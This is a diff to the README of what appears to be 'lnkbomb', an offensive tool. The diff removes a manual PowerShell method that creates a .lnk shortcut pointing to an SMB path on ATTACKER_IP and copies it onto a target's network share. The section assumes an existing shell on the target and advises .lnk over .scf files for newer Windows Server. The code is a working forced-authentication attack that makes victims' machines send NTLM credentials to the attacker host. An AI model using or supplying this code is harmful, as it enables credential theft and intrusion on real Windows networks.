@@ -191,27 +191,6 @@ python3 lnkbomb.py ... -r PAYLOAD_FILENAME.url
 
 ---
 
-## Alternative — Manual PowerShell Method
-
-If pysmb connectivity issues persist, generate and place the payload directly on the target via PowerShell (requires an existing shell on the target):
-
-```powershell
-$objShell = New-Object -ComObject WScript.Shell
-$lnk = $objShell.CreateShortcut("C:\legit.lnk")
-$lnk.TargetPath = "\\ATTACKER_IP\@pwn.png"
-$lnk.WindowStyle = 1
-$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
-$lnk.Description = "test"
-$lnk.HotKey = "Ctrl+Alt+O"
-$lnk.Save()
-
-Copy-Item "C:\legit.lnk" "\\TARGET\ShareName\SubDir\"
-```
-
-> Note: `.scf` files no longer work on Windows Server 2019+. Use `.lnk` files instead.
-
----
-
 ## Requirements
 
 - Python 3
